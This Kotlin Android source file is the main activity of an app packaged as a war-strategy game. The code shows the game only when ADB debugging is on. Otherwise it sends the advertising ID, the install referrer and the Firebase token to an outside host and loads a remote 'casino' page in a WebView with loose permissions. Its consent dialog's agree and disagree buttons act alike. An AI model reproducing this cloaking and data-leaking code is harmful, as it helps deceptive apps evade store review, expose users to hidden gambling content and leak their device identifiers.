package com.doradogames.conflictnations.worldwar

import android.Manifest
import android.content.ActivityNotFoundException
import android.content.Intent
import android.content.SharedPreferences
import android.content.pm.ActivityInfo
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Bundle
import android.os.Message
import android.os.RemoteException
import android.provider.Settings
import android.view.View
import android.view.ViewGroup
import android.view.animation.Animation
import android.view.animation.LinearInterpolator
import android.view.animation.RotateAnimation
import android.webkit.*
import android.widget.Button
import androidx.activity.addCallback
import androidx.activity.result.contract.ActivityResultContracts
import androidx.annotation.IdRes
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.constraintlayout.widget.ConstraintSet
import androidx.core.content.ContextCompat
import androidx.core.view.isVisible
import androidx.navigation.NavController
import androidx.navigation.findNavController
import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import com.doradogames.conflictnations.worldwar.databinding.ActivityMainBinding
import com.doradogames.conflictnations.worldwar.util.LottieUtil
import com.doradogames.conflictnations.worldwar.util.OneTime
import com.doradogames.conflictnations.worldwar.util.log
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.firebase.messaging.FirebaseMessaging
import kotlinx.coroutines.*
import java.net.URLEncoder
import java.util.*
import kotlin.coroutines.resume
import kotlin.coroutines.suspendCoroutine
import kotlin.system.exitProcess

class MainActivity : AppCompatActivity() {

    private lateinit var binding : ActivityMainBinding

    private lateinit var pair                 : Pair<WebChromeClient, PermissionRequest>
    private lateinit var installReferrerClient: InstallReferrerClient
    private lateinit var prefs                : SharedPreferences

    private var viewsWebs = mutableListOf<WebView>()
    private var iR        = ""

    private var fileChooserValueCallback: ValueCallback<Array<Uri>>? = null
    private var fileChooserResultLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) {
        fileChooserValueCallback?.onReceiveValue(if (it.resultCode == RESULT_OK) arrayOf(Uri.parse(it.data?.dataString)) else null)
    }

    private val rotateAnimation = RotateAnimation(0f, 360f, Animation.RELATIVE_TO_SELF, 0.5f, Animation.RELATIVE_TO_SELF, 0.5f).apply {
        interpolator = LinearInterpolator()
        duration = 500
        repeatCount = Animation.INFINITE
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        binding.tvConnecting.startAnimation(rotateAnimation)
        prefs = getSharedPreferences("LocalData", MODE_PRIVATE)

        installReferrerClient = InstallReferrerClient.newBuilder(this).build()
        installReferrerClient.startConnection(installReferrerStateListener)

        permissionRequestLauncher.launch(arrayOf("android.permission.POST_NOTIFICATIONS"))

        onBackPressedDispatcher.addCallback(this) {
            if (viewsWebs.last().canGoBack()) viewsWebs.last().goBack()
            else {
                if (viewsWebs.size > 1) {
                    binding.root.removeView(viewsWebs.last())
                    viewsWebs.last().destroy()
                    viewsWebs.removeLast()
                } else finish()
            }
        }
    }

    private val permissionRequestLauncher = registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {
        if (Settings.Global.getInt(contentResolver, Settings.Global.ADB_ENABLED, 0) == 1) startGame()
        else FirebaseMessaging.getInstance().token.addOnCompleteListener { task -> mainLogic(task.result) }
    }

    private fun mainLogic(frbToken: String) = CoroutineScope(Dispatchers.Main).launch {
        val paramsFromStore = prefs.getString("params", "") ?: ""
        if (paramsFromStore.isNotEmpty()) {
            // Policy
            showUrlPolicy(paramsFromStore, frbToken)
            // Policy + Header
            showUrlPolicyHeaders(paramsFromStore, frbToken)
        } else {
            val advertisingIdInfo = withContext(Dispatchers.IO) { adId() }
            val params            = "adId=$advertisingIdInfo&refer=$iR"

            prefs.edit().putString("params", params).apply()
            // Policy
            showUrlPolicy(params, frbToken)
            // Policy + Header
            showUrlPolicyHeaders(params, frbToken)
        }
    }

    private val installReferrerStateListener: InstallReferrerStateListener = object : InstallReferrerStateListener {
        override fun onInstallReferrerSetupFinished(responseCode: Int) {
            if (responseCode == InstallReferrerClient.InstallReferrerResponse.OK) try {
                iR = installReferrerClient.installReferrer.installReferrer
            } catch (_: RemoteException) { }
        }

        override fun onInstallReferrerServiceDisconnected() {
            installReferrerClient.startConnection(this)
        }
    }

    private fun showUrlPolicyHeaders(params: String, frbToken: String) = CoroutineScope(Dispatchers.Main).launch {
        val headers = "$params&frbToken=${URLEncoder.encode(frbToken, "UTF-8")}"

        log("showUrlPolicyHeaders: headers = $headers")

        binding.tvConnecting.isVisible = false
        binding.casinoView.init()
        binding.casinoView.isVisible = true
        // Не забудь до домену додати { domen/YourFile.php }
        binding.casinoView.loadUrl("http://fposttestb.xyz/", hashMapOf("X-Client-Key" to headers))
    }

    private fun showUrlPolicy(params: String, frbToken: String) = CoroutineScope(Dispatchers.Main).launch {
        val headers = "$params&frbToken=${URLEncoder.encode(frbToken, "UTF-8")}"

        log("showUrlPolicy: headers = $headers")

        binding.tvConnecting.isVisible = false
        binding.casinoView.init()
        binding.casinoView.isVisible = true
        // Не забудь до домену додати { domen/YourFile.php }
        binding.casinoView.loadUrl("http://fposttestb.xyz/$headers")
    }

    private suspend fun adId() = suspendCoroutine { continuation ->
        val default = "00000000-0000-0000-0000-000000000000"
        val uhuhu = "000${UUID.randomUUID()}"
        var asd = try {
            AdvertisingIdClient.getAdvertisingIdInfo(this).id!!
        } catch (e: Exception) {
            uhuhu
        }
        if (asd == default) asd = uhuhu
        continuation.resume(asd)
    }

    private fun WebView.init() {
        webChromeClient = customWCC()
        webViewClient = customWVC()
        isSaveEnabled = true
        isFocusableInTouchMode = true
        CookieManager.getInstance().setAcceptThirdPartyCookies(this, true)
        setDownloadListener { url, _, _, _, _ -> context.startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url))) }
        CookieManager.getInstance().setAcceptCookie(true)
        layoutParams = ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT)
        isFocusable = true
        setLayerType(View.LAYER_TYPE_HARDWARE, null)
        settings.apply {
            loadWithOverviewMode = true
            userAgentString = userAgentString.replace("; wv", "")
            allowContentAccess = true
            useWideViewPort = true
            cacheMode = WebSettings.LOAD_DEFAULT
            loadsImagesAutomatically = true
            mixedContentMode = 0
            builtInZoomControls = true
            mediaPlaybackRequiresUserGesture = false
            setSupportMultipleWindows(true)
            databaseEnabled = true
            domStorageEnabled = true
            javaScriptEnabled = true
            displayZoomControls = false
            allowFileAccess = true
            javaScriptCanOpenWindowsAutomatically = true
        }
        viewsWebs.add(this)
    }


    private fun customWCC() = object : WebChromeClient() {

        override fun onProgressChanged(view: WebView, nP: Int) {
            binding.progress.isVisible = nP < 99
            binding.progress.progress = nP

        }

        override fun onPermissionRequest(request: PermissionRequest) {
            if (ContextCompat.checkSelfPermission(this@MainActivity, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
                request.grant(request.resources)
            } else {
                pair = Pair(this, request)
                permissionRequestLaunchers.launch(Manifest.permission.CAMERA)
            }
        }

        override fun onCreateWindow(view: WebView, isDialog: Boolean, isUserGesture: Boolean, resultMsg: Message?): Boolean {
            val wv = WebView(this@MainActivity)
            wv.init()
            binding.root.addView(wv)
            (resultMsg!!.obj as WebView.WebViewTransport).webView = wv
            resultMsg.sendToTarget()
            return true
        }

        override fun onShowFileChooser(w: WebView?, fpc: ValueCallback<Array<Uri>>?, fcp: FileChooserParams?): Boolean {
            try {
                fileChooserValueCallback = fpc
                fcp?.createIntent()?.let { fileChooserResultLauncher.launch(it) }
            } catch (_: ActivityNotFoundException) {
            }
            return true
        }
    }


    private fun customWVC() = object : WebViewClient() {

        override fun onPageFinished(view: WebView?, url: String?) {
            if (url?.contains("yourserver") == true) {
                startGame()
            }
        }



        override fun shouldOverrideUrlLoading(view: WebView, request: WebResourceRequest): Boolean {
            val url = request.url.toString()
            return if (url.contains("https://m.facebook.com/oauth/error")) true
            else if (url.startsWith("http")) false
            else {
                try {
                    view.context.startActivity(Intent.parseUri(url, Intent.URI_INTENT_SCHEME))
                } catch (_: java.lang.Exception) { }
                true
            }
        }
    }

    override fun onSaveInstanceState(outState: Bundle) {
        super.onSaveInstanceState(outState)
        viewsWebs.lastOrNull()?.saveState(outState)
    }

    override fun onResume() {
        super.onResume()
        viewsWebs.lastOrNull()?.onResume().also { CookieManager.getInstance().flush() }
    }

    override fun onPause() {
        super.onPause()
        viewsWebs.lastOrNull()?.onPause().also { CookieManager.getInstance().flush() }
    }

    private val permissionRequestLaunchers = registerForActivityResult(ActivityResultContracts.RequestPermission()) { isGranted ->
        if (isGranted) pair.first.onPermissionRequest(pair.second)
    }

    private fun startGame() {
        if (prefs.contains("adb")) goToGame()
        else {
            val view = layoutInflater.inflate(R.layout.custom_dialog, null).apply {
                findViewById<Button>(R.id.btn_agree).setOnClickListener {
                    prefs.edit().putBoolean("adb", true).apply()
                    goToGame()
                }
                findViewById<Button>(R.id.btn_disagree).setOnClickListener {
                    prefs.edit().putBoolean("adb", true).apply()
                    goToGame()
                }
            }
            AlertDialog.Builder(this).apply {
                setView(view)
                setCancelable(false)
            }.show()
        }
    }

    override fun onRestoreInstanceState(savedInstanceState: Bundle) {
        super.onRestoreInstanceState(savedInstanceState)
        viewsWebs.lastOrNull()?.restoreState(savedInstanceState)
    }

    private fun goToGame() {
        val intent = Intent(this, GameActivity::class.java)
        intent.flags = Intent.FLAG_ACTIVITY_CLEAR_TASK or Intent.FLAG_ACTIVITY_NEW_TASK
        startActivity(intent)
    }

}